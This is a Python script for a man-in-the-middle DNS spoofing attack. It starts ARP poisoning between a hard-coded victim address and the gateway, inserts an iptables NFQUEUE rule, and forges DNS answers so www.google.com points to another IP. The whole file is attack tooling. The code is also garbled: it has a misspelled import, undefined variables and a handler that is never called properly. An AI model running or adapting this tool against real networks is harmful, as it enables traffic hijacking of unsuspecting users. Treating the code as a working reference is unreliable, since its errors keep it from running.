from typing import Any
from netfilterqueue import NetfilterQueue
import os
import ArpPoison
import threading
from scapy.all import IP, UDP, NDS, DNSRR, DNSQR, Ether

class Dns_spoof:

    def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
        self.queue_num = 1
        self.pktCounter = 0

    def __call__(self) -> None:

        arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
        arpThread.start()

        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
        self.queue = NetfilterQueue()
        self.queue.bind(queue_num, call_back)

        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}')
            print("iptables flushed")
        
    def call_back(bin_packet):
        packet = IP(bin_packet.get_payload())
        if packet.haslayer(DNSRR):
            try:
                queryName = packet[DNSQR].qname
                if queryName in host:
                    packet[DNS].an = DNSRR(
                        rrname=queryName, rdata=host[queryName])
                    packet[DNS].ancount = 1
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].len
                    del packet[UDP].chksum
            except IndexError as error:
                return False
            bin_packet.set_payload(bytes(packet))
        return bin_packet.accept()

if __name__ == '__main__':
    host = ("www.google.com", "188.114.96.0")
    queue_num = 1
    ipVictim = '192.168.178.144' # The IP address of the victim
    ipServer = '192.168.178.1' # The IP address of the gateway    
    Dns_spoof(queue_num, ipVictim, ipServer, host)    
